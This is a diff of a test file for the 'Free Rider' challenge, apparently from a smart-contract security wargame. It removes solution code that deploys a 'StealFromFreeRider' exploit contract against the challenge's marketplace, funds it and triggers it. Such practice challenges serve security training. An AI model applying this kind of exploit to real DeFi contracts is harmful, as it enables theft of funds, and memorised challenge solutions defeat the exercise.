@@ -106,11 +106,6 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        steal = await (await ethers.getContractFactory('StealFromFreeRider', player)).deploy(
-            nft.address, marketplace.address, devsContract.address, weth.address, uniswapPair.address, NFT_PRICE
-        );
-        await token.transfer(steal.address, 10000n * 10n ** 18n);
-        await steal.connect(player).start();
     });
 
     after(async function () {
